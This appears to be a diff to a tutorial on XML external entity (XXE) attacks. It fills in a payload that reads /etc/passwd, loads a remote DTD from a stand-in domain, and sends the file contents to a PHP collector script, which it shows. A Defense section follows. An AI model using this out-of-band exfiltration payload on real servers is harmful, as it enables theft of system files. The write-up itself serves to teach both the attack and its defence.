@@ -74,7 +74,7 @@ Make server deliver the data to us
 // XML for server side
 <?xml version="1.0"?>
 <!DOCTYPE ANY[
-<!ENTITY % file SYSTEM "what-do-you-want">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % remote SYSTEM "http://domain/xxe.dtd">
 %remote;
 %all;
@@ -89,9 +89,9 @@ test.php
 ```php
 file_put_contents("test.txt",$_GET['a']);
 ```
-The whole process of exploit：server parsed my xml input, and import dtd of my domain while parsing `remote`  
-On `xxe.dtd`, there are `all` and `send` parameter entities, while parsing `send` entity, it would request to my `test.php`  
-`test.php` would put content you want into the file of ```test.txt```.  
+The whole process of exploit：server parsed my xml input, and import dtd of my domain while parsing `remote`.  
+On `xxe.dtd`, there are `all` and `send` parameter entities, while parsing `send` entity, it would request to my `test.php` with `/etc/passwd` from the first part.  
+At the end, `test.php` would put content of `/etc/passwd` into the file of `test.txt`.  
 
 ## Defense
 ```php
